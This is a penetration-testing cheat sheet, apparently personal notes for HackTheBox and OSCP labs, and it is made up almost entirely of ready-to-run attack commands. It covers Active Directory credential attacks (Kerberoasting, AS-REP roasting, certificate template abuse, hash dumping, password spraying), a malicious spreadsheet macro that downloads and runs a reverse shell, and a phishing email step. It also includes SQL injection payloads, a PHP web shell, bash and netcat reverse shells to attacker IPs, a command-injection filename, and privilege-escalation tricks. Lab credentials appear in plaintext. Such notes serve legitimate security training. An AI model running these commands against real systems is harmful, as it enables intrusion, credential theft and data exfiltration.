# Enumeration for Initial Access 

## AutoRecon
Save IP(s) to targets.txt 
```
autorecon -t targets.txt -vvv --ignore-plugin-checks
```

# NMAP 

Basic
```
sudo nmap -sC -sV 192.168.247.40 -oN nmap-internal
```

All ports 
```
sudo nmap -p- 192.168.247.40 -oN nmap-internal-all-ports
```

UDP ports
```
sudo nmap -sU --top-ports 100 192.168.247.40 -oN nmap-internal-udp
```
## Windows 

### Kerbrute 
 
Identify valid users with user list 
```
./kerbrute userenum --dc 10.10.11.236 -d manager.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```
### NetExec

Identify valid users 
```
netexec smb 10.10.11.236 -k -u 'ryan' -p ''
```

Identify valid users with RID bruteforce **this may not work**
```
nxc smb 10.10.11.35 -u '.' -p '' --rid-brute
```

Bruteforce users with the password of their username (ex: admin:admin)
```
netexec smb 10.10.11.236 -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

List users with valid credentials
```
nxc smb 10.10.11.41 -u judith.mader -p judith09 --users
```

Enumerate smb shares with valid credentials
```
netexec smb 10.10.11.236 -u operator -p operator --shares
```

Test login for smb with *hash
```
nxc smb 192.168.120.172 -u Administrator -H 608339ddc8f434ac21945e026887dc36
```

Test login for *mssql* with valid credentials
```
netexec mssql 10.10.11.236 -u operator -p operator
```

Test login for *winrm* with valid credentials
```
netexec winrm 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
```

### ldapsearch 
Get DC info 
```
ldapsearch -x -H ldap://10.10.10.161 -x -s base
```

```
ldapsearch -x -H ldap://10.10.10.161 -x -b 'DC=htb,DC=local' > ldapinfo.txt
```

List users in domain
```
ldapsearch -x -b "dc=htb,dc=local" -H ldap://10.10.10.161 '(ObjectClass=User)' sAMAccountName | grep sAMAccountName | awk '{print $2}'
```

List service accounts in the domain (may miss some from above query)
```
ldapsearch -x -b "dc=htb,dc=local"  -H ldap://10.10.10.161 | grep -i -a 'Service Accounts'
```

Search for objects and hopefully discover creds in descriptions..
```
ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.175.122" "(objectclass=*)"
```

Use found creds to determine if user has LAPS access
```
ldapsearch -x -H "ldap://192.168.188.122" -D "hutch\fmcsorley" -w "CrabSharkJellyfish192" -b "dc=hutch,dc=offsec" '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
```
- If there is ms-MCS-AdmPwd -> use psexec to login with that pass as administrator

### DNS Enum 

[Cheatsheet](https://hacktricks.boitatech.com.br/pentesting/pentesting-dns)
```
dnsenum 192.168.175.122
```

```
dig @$IP axfr internal
```

```
dig ANY @<DNS_IP> <DOMAIN> 
```
### RDP 
Maybe we can see credentials 
```
rdesktop internal
```

### IMAP

Likely need valid credentials before connection
```
telnet 192.168.236.140 143
```

### Certipy
[Reference](https://seriotonctf.github.io/ADCS-Attacks-with-Certipy/)
Search for vulnerable active directory certificates / services on Kali
```
certipy-ad find -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -stdout -vulnerable
```

#### ESC7 Vuln Exploit with Certipy

Add officer raven to be able to manage ca's

```
certipy-ad ca -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -add-officer raven
```

Enable sub-ca template
```
certipy-ad ca -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -enable-template subca
```

Set upn to administrator and save the private key 

```
certipy-ad req -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb
```

Now we can issue a certificate because we are an officer of the ca

```
certipy-ad ca -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -issue-request <NUMBER of PRIVATE KEY>
```

Retrieve the certificate administrator.pfx
```
certipy-ad req -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -retrieve <NUMBER of PRIVATE KEY>
```

Ensure our local clock is in sync with DCs

```
sudo ntpdate 10.10.11.236
```

Get a TGT from the domain using pfx and then get the NT hash for administrator

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236
```

Login with impacket-psexec
```
impacket-psexec -hashes <NT HASH>:<NT HASH> administrator@10.10.11.236
```

## Linux 

### Enum4linux

Enum usernames
```
enum4linux -U 192.168.247.42
```

### SMTP
Port 25

User enum 
```
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 192.168.247.42
```

# Windows Initial Access

## Impacket

### mssqlclient.py
```
mssqlclient.py manager/operator:operator@manager.htb -windows-auth
```
- `enable_xp_cmdshell` - elevate to system
- `xp_dirtree` - read files
- `help`- list commands

```
SELECT name FROM master..sysdatabases;
```

```
use <DB NAME>;
```

```
impacket-mssqlclient publicuser:GuestUserCantWrite1@sequel.htb
```
#### Intercept hash of user running MSSQL
##### xp_dirtree fake share
```
xp_dirtree \\10.10.14.8\fake\share
```

On Kali, set up responder 
##### Responder
```
sudo responder -I tun0
```

Execute xp_dirtree command and catch the sql_svc hash
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526212929.png]]
- Crack this NetNTLMv2 hash using hashcat and rockyou.txt (hashcat autodetected the hash mode to use)
### psexec.py
Login with NT Hash
```
psexec.py -hashes <NT HASH>:<NT HASH> administrator@10.10.11.236
```

Login with password
```
impacket-psexec monteverde.htb/administrator:'d0m@in4dminyeah!'@10.10.10.172
```
### secretsdump.py

Dump hashes and secrets, password history, and when password was last set
```
secretsdump.py -user-status -history -pwd-last-set administrator.htb/ethan@10.10.11.42
```
- paste in password

Dump ntds.dit using system boot key
```
secretsdump.py local -system system -ntds ntds.dit 
```

Use secrets dump when user has DCSync in BloodHound
```
impacket-secretsdump egotistical-bank.local/svc_loanmgr@10.10.10.175
```
### Kerberoasting 

#### impacket-getTGT
Get TGT using svc account creds
```
impacket-getTGT active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
```

Export the .ccache file 
```
export KRB5CCNAME=svc_tgs.ccache
```

#### impacket-GetUserSPNs
```
impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
```

#### crack krb5 tgs hash
```
hashcat -m 13100 GetUserSPNs.out /usr/share/wordlists/rockyou.txt 
```

#### impacket-psexec
psexec in as administrator with cracked password
```
impacket-psexec active.htb/Administrator:Ticketmaster1968@active.htb
```

#### impacket-ticketConverter
```
impacket-ticketConverter ticket.kirbi ticket.ccache 
```
### AS-REP Roasting
Find users with Kerberos Pre-Authentication disabled 
#### impacket-GetNPUsers
```
impacket-GetNPUsers -dc-ip 10.10.10.161 -request 'htb.local/'
```

Knowing or guessing username 
```
impacket-GetNPUsers -dc-ip 10.10.10.175 -request 'egotistical-bank.local/FSmith'
```
#### Crack the AS-REP hash with hashcat
```
hashcat -m 18200 svc.hash /usr/share/wordlists/rockyou.txt 
```

## Evil-WinRM

Login with password
```
evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
```

Login with NT Hash 
```
evil-winrm -i 10.10.11.236 -H <NT HASH> -u administrator
```

Login with cert and pem files over winrm over ssl (5986)
```
evil-winrm -S -i 10.10.11.152 -c key.cert -k key.pem
```

## WebDAV 
Port: 
Authenticate to WebDAV server 
```
cadaver $IP  
```
- After auth -> pop a shell onto the server with put command

# Phishing 

## Malicious macro creation 

## Malicious Macro Generator LibreOffice/OpenOffice
[GitHub Repo](https://github.com/0bfxgh0st/MMG-LO/)
Create malicious calc spreadsheet that downloads PowerCat.ps1 to target and launches reverse shell 
### Payload in mmg-ods.py
```
build_payload = (f'IEX(New-Object System.Net.WebClient).DownloadString("http://192.168.45.152/powercat.ps1");powercat -c {ip} -p {port} -e powershell')
```

### Generate malicious ODS file 
```
python3 mmg-ods.py windows <ATTACKER IP> <ATTACKER PORT>
```

## Send Phishing Email 

### swaks 
Send malicious LibreOffice .ods file 
```
sudo swaks -t mailadmin@localhost --from jonas@localhost --attach @file.ods --server 192.168.236.140 --body "Please check this spreadsheet" --header "Subject: Please check this spreadsheet"
```

## Web App
### Directory Busting 

Specify output directory with `-o`
```
gobuster -u http://10.10.10.121 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o http-root-gobuster.log
```

```
gobuster dir -u http://soccer.htb/ -w /usr/share/Seclists/Discovery/Web-Content/raft-small-words.txt
```

Add file extension with `-x`
```
gobuster dir -u http://10.10.10.146 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```

disable certificate checks with `-k`
```
gobuster dir -u https://nagios.monitored.htb/ -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

```
feroxbuster -u http://siteisup.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

Filter down results 
```
feroxbuster -u "http://bitforge.lab" -w /usr/share/seclists/Discovery/Web-Content/common.txt --depth 2 --filter-status 404
```

With IP as env variable 
```
feroxbuster -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
### Virtual Host Enumeration 

Filter by output length 
```
gobuster vhost -k -u https://monitored.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --exclude-length 301
```

```
ffuf -u http://linkvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.linkvortex.htb'
```
- Execute this and then add `-fs <SIZE #>`
### Error-Based SQLi

[MySQL INFORMATION_SCHEMA Table Reference](https://dev.mysql.com/doc/refman/8.4/en/information-schema-table-reference.html) ➡ [SCHEMATA Table](https://dev.mysql.com/doc/refman/8.4/en/information-schema-schemata-table.html)

```
1 AND EXTRACTVALUE(1,concat(0x0a, (select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1)))
```
- Expected to return 'information_schema'

Get database names
```
1 AND EXTRACTVALUE(1,concat(0x0a, (select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA)))
```

Get columns of a specific database
```
1 AND EXTRACTVALUE(1,concat(0x0a, (select group_concat(TABLE_NAME, ":", COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = '<db_name>')))
```

Get table name (one row at a time) by toggling LIMIT n,1 
```
1 AND EXTRACTVALUE(1,concat(0x0a, (select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = '<db_name>' LIMIT 1,1)))
```

### Fuzzing

Fuzzing port numbers & filtering out 61 byte response
```
ffuf -request ssrf.req -request-proto http -w <(seq 1 65535) -fs 61
```

Fuzzing URL parameters with api wordlist
```
wfuzz -u 'http://10.10.10.185/index.php?FUZZ=index' -w /usr/share/seclists/Discovery/Web-Content/api/actions.txt
```
Then use `--hl` `<output length #>`

Fuzzing parameters
```
ffuf -k -u https://streamio.htb/admin/?FUZZ=id -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H 'Cookie: PHPSESSID=08sh76uacn9daglkqgk392eqvb' -fs 1678
```

Fuzzing search bar parameters with ffuf
```
ffuf -k -u https://watch.streamio.htb/search.php -d "q=FUZZ" -w /usr/share/seclists/Fuzzing/special-chars.txt -H 'Content-Type: application/x-www-form-urlencoded'
```
- Variable sizes indicate some possibly SQLi vulnerability
- Test characters one by one and try to guess syntax of the SQL

Fuzz sub-directories (target IIS servers)
```
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --sc 200,301 $URL/FUZZ
```
### SSTI

Check for SSTI vulnerability 
```
${{<%[%'"}}%\.
```
- Determine if it's SSTI or SQLi by removing some of the bad characters from SSTI payload.
	- if server fails on `'` - likely SQLi

### PHP Rev Shell

Append 'gif89' magic bytes to php web shell
```
echo -e -n "\x47\x49\x46\x38\x39\x61" > magic_bytes.tmp
```

```
cat magic_bytes.tmp web-shell.php > web-shell.php.gif
```

### Web Shell
```
<?php system($_GET['cmd']); ?>
```

### Reverse Shell as parameter for Web Shell in Burp

```
GET /uploads/10_10_14_10.php.gif?cmd=bash -i >& /dev/tcp/10.10.14.10/9001 0>&1
```

### Linux BusyBox Rev Shell 
```
busybox nc 192.168.1.10 4444 -e /bin/sh
```
- Use cases: nc unavailable / this is a linux all purpose shell

### CSRF
## SMB Enumeration

### NetExec

List SMB shares with valid creds
```
nxc smb 10.10.11.14 -u maya -p m4y4ngs4ri --shares
```

### SMBClient 

Unauthenticated - enum shares
```
smbclient -L //10.10.11.202/
```

Use SMBClient to read shares 
```
smbclient -U maya //10.10.11.14/Important\ Documents
```
- `mget *` to download everything

Linux: Grep for passwords in lots of files 
```
grep -rinE '(password|username|user|pass|key|token|secret|admin|login|credentials)'
```

Windows PowerShell: Search for all of those keywords (do not do this in C:\ drive)
Execute in C:\xampp
```
Get-ChildItem -Path . -Recurse -File | Select-String -Pattern 'passwordkey|admin' -CaseSensitive:$false
```

Read shares using valid user + pass
```
smbclient -U 'cicada/david.orelious%P@ssw0rd! //10.10.11.35/dev'
```

### SMBMap
```
smbmap -H 10.10.10.100
```

Read share contents
```
smbmap -H 10.10.10.100 -r Replication --depth 10
```
## SNMP Enumeration 

```
snmpwalk -v2c -c public 10.10.11.248
```

```
snmpwalk -v2c -c public 10.10.11.248 -m all
```

Faster method with snmpbulkwalk

```
snmpbulkwalk -v2c -c public 10.10.11.248 -m all | tee snmp.out
```

```
snmpbulkwalk -Cr1000 -c public -v2c 10.10.11.136 . > snmpwalk.1
```

Check what's running on the box 
```
grep SWRunName snmp.out
```

Then Review running processes and further enumerate services such as 'sh,bash,sleep' to see how they are used and possibly find a password leak.

Checking where bash is executed 

```
grep SWRun snmp.out | grep 1432
```

![[HackTheBox/Linux/attachments/Pasted image 20250505212643.png]]
- see a script running - `check_host.sh` svc and probably a password `XjH7VCehowpR1xZB`

grep for bash 
```
grep bash snmp.out
```
## RPCCLIENT Enumeration

```
rpcclient -U '' 10.10.10.248
```

Add -N to say no password 
```
rpcclient -U '' -N 10.10.10.248
```

## SNMP Check for Linux 
```
snmp-check 192.168.247.42 -c public
```
### Authenticated RPCCLIENT Enumeration
[Cheatsheet](https://blog.1nf1n1ty.team/hacktricks/network-services-pentesting/pentesting-smb/rpcclient-enumeration)

```
enumdomusers
```

Set user password
```
setuserinfo2 targetusername 23 'newpassword'
```

```
querydispinfo
```
## Active Directory Enumeration

### Kerbrute 

Enumerate users in a domain
```
./kerbrute userenum --dc 10.10.10.248 -d intelligence.htb <username-list>
```

Password spraying users in a domain
```
./kerbrute passwordspray --dc 10.10.10.248 -d intelligence.htb <username-list> 'Passw0rd!'
```

### Bloodhound

```
python3.8 bloodhound.py -ns 10.10.10.248 -d intelligence.htb -dc dc.intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -c All
```

Start bloodhound server 
```
cd ~/Tools/AD-Enumeration/New-Bloodhound-App; docker compose up -d
```
using bloodhound community edition branch 
```
python3 bloodhound.py -d certified.htb -u 'judith.mader' -p 'judith09' -c all -ns 10.10.11.41 
```

# Reverse Shells

[Reverse Shell Generator ](https://www.revshells.com/)
## PHP

[PHP-Reverse-Shell for Windows and Linux ](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)

Bash TCP reverse shell one-liner:
```
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
```

Bash reverse shell one-liner executed as command in Bash:
```
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```

## Windows

[Nishang Shells](https://github.com/samratashok/nishang/tree/master/Shells)

# Interactive Shell 
[Reference](https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell)
Get an interactive shell 

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```
export TERM=xterm
```


Hit CTRL + Z


```
stty raw -echo; fg
```

💡in case tty gets weird and line wrappy 💡
```
stty columns 136 rows 32
```

## MSFVenom

Create custom Windows reverse shell 
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.152 LPORT=445 -f exe > shell.exe
```
- Applications: service binary replacement, execute with RunasCs access, etc.
# Linux Privilege Escalation 

## Automated

Linpeas
```
wget http://10.10.14.10:3000/linpeas.sh
```
- `./linpeas.sh`

## Enumerate Users 

```
cat /etc/passwd | grep 'sh$'
```

Pagefile - `!/bin/sh`
Nginx/SUDO - [PoC](https://github.com/DylanGrl/nginx_sudo_privesc/tree/main)
## Find SETUID Binaries 

```
find / -perm -4000 2>/dev/null
```

## Find Capabilities

```
/usr/sbin/getcap -r / 2>/dev/null
```
- Use GTFOBins for exploits

## Exploiting Kernel Vulnerabilities

```
cat /etc/issue
```

```
uname -r
```

```
arch
```

Example searchsploit search 
```
`searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"`
```

## Symlinks
Scenario - after running `sudo -l`, discover .sh script that zips a bunch of files. 
![[HackTheBox/Linux/attachments/Pasted image 20250506193545.png]]
- Add symlink within this script
- Find a file we have write access to in the `/var/components/profile` dir and make a copy of it
- Give root's id_rsa key the name of this file
Move the original file
```
mv cmdsubsys.log cmdsubsys.log~
```

Give root's ssh key this file's name
```
ln -s /root/.ssh/id_rsa cmdsubsys.log
```

Now execute the getprofile.sh script as sudo and find the cmdsubsys.txt file containing the root ssh key. 

## Service Binary Replacement
Scenario - after running `sudo -l`, discover a .sh script we can execute as root. 

This sh script restarts a service binary called nagios. 

Determine that nagios binary is owned by us 
```
stat /usr/local/nagios/bin/nagios
```

![[HackTheBox/Linux/attachments/Pasted image 20250506210424.png]]

Rename the `nagios` binary to `nagios~`

```
mv nagios nagios~
```

Create a new file called `nagios` and paste in reverse shell. Make it executable `chmod +x`

```
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.10/9001 0>&1
```

Set up nc listener. Restart the nagios service with sudo permissions. Catch root shell.

## Exploiting php exec() function
- this function is like sudo and executes as root

Example php code to exploit for priv esc 
```
    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```
- we can control $value by inserting malicious file 

```
touch -- ';nc -c bash 10.10.14.3 9001;.php'
```

## Path Hijacking

Notice this string within a SUID binary we have access to
![[OSCP/attachments/Pasted image 20250622211738.png]]
- tar utiity is no using absolute path -> can hijack for priv esc

```
echo /bin/bash > tar
```

```
export PATH=/home/matt:$PATH
```

```
echo $PATH
```

```
chmod +x tar
```

```
which tar
```

### Resolve setresuid issue

Generate an ssh key for initial access user and ssh in 

Generate ssh key for matt on kali
```
ssh-keygen -f matt
```

```
chmod 600 matt
```

Set up simple python server to transfer the ssh public key to matt's .ssh directory into `authorized_keys`
## Transfer Files 
On Kali
```
nc -lvnp 9001 > RT30000.zip 
```

On rev shell 
```
cat RT30000.zip > /dev/tcp/10.10.14.8/9001
```

## Discover Additional Sites 

Check 
```
/etc/apache2/sites-enabled
```

Set up SSH port forward to reach site from initial access shell 
```
ssh -L 8000:127.0.0.1:80
```

From Kali box - port 8000 should be listening & remote site accessible via web browser
```
ss -lnpt | grep 8000
```


# Windows Privilege Escalation
## ✨Resources✨
- [Internal All The Things](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/)

## Manual Enum

Check for hidden files 
```
dir /a
```
## Pass the Hash

### pth-toolkit
[pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit/tree/master)

```
pth-winexe -U jenkins/administrator //10.10.10.63 cmd.exe
```

## Abusing Token Privileges 
[Abusing Token Privileges](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/) 

**How to enumerate 
```
whoami /priv 
```
Abusable privileges
```
- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege
- SeManageVolumePrivilege
```

### SeImpersonatePrivilege

[Rotten Potato](https://github.com/foxglovesec/RottenPotato) 

[JuicyPotato](https://github.com/ohpe/juicy-potato/tree/master)- worked on Microsoft Windows Server 2008 Standard (x86)

Juicy Rev Shell - See [[Authby]]
```
.\Juicy.Potato.x86.exe -l 1360 -p c:\windows\system32\cmd.exe -a "/c c:\users\Public\nc.exe -e cmd.exe 192.168.45.152 242"
```

[CLSID Lists](https://github.com/ohpe/juicy-potato/blob/master/CLSID/Windows_Server_2008_R2_Enterprise/CLSID.list)

#### Check .NET Environment
[God Potato](https://github.com/BeichenDream/GodPotato/releases?source=post_page-----d42c9c1e7f9e---------------------------------------) 
```
cd reg query "HKLM\Software\Microsoft\Net Framework Setup\NDP" /s
```

or 

```
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse
```

Transfer GodPotato to target and test with 'whoami'
```
.\GodPotato-NET4.exe -cmd "whoami"
```

Create an msfvenom rev shell payload 
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.152 LPORT=9002 -f exe > rev2.exe
```

Execute this payload with GodPotato 
```
.\GodPotato-NET4.exe -cmd "c:\users\tony\rev2.exe"
```

[JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG)
```
.\jp.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami > C:\juicy.txt"
```
### SeBackupPrivilege

#### reg save sam and system archives

```
reg save HKLM\SAM SAM
```

```
reg save HKLM\SYSTEM SYSTEM
```

Transfer these files to Kali box and run secretsdump.py to extract administrator hash
##### secretsdump.py
```
secretsdump.py local -sam sam -system system
```

#### robocopy ntds.dit

## Unquoted Service Paths 

Detection in PowerShell
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```

Detection in CMD
```
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

### SeManageVolumePrivilege 
[[Access]]

### SeMachineAccountPrivilege
[[Heist]]
### Automated Scripts
#### JAWS
Execute [JAWS](https://github.com/411Hall/JAWS) script 
# Transferring Files 

## SMB Server 

On Kali box
```
impacket-smbserver NameofShare `pwd`
```

On Target box 
```
New-PSDrive -Name "NameofDrive" -PSProvider "FileSystem" -Root "\\10.10.14.30\NameofShare"
```

Change into drive on target box
```
cd NameofDrive
```

Copy file to transfer into the directory 
```
cp C:\Windows\kohsuke\Documents\CEH.kdbx .
```

## SCP

## Command Prompt 
**Certutil**
```
certutil -urlcache -split -f http://192.168.45.152:8888/Juicy.Potato.x86.exe
```


# Hash Cracking 

## John 

### Obtain hash from KeePass database 

```
keepass2john CEH.kdbx
```

## Hashcat

[Hash modes](https://hashcat.net/wiki/doku.php?id=example_hashes)

```
hashcat -m 13400 jeeves-keepass.hash /usr/share/wordlist/rockyou.txt
```

hashcat hashes with user:pass
```
hashcat -m 0 --user user.hashes /usr/share/wordlists/rockyou.txt
```

show matches
```
hashcat -m 0 --user user.hashes /usr/share/wordlists/rockyou.txt --show
```

# Encoding Payloads

## Windows 

Base64 (UTF-16LE) encode using Kali terminal

```
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8001/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
```


# Port Forwarding 

Web server running on remote host on port 8443 & want to access via local web browser. Execute this on kali shell
```
ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184 -N
```

Then navigate to 127.0.0.1:8443 in web browser

Another example:
![[OSCP/attachments/Pasted image 20250622143231.png]]

# MYSQL 

See column names from table
```
describe llx_user;
```

View specific column data  from table
```
select login, pass, pass_crypted from llx_user;
```